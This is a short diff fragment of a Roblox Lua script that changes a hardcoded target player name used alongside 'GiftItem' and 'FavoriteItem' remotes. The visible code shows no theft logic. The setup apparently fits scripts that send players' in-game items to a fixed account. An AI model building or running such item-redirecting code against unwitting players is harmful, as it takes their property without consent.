@@ -183,7 +183,7 @@ task.spawn(function()
     end
 end)
 
-local TARGET_PLAYER_NAME = "hadukin_53"
+local TARGET_PLAYER_NAME = "SH4RKSTORAGE29"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
 local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
 
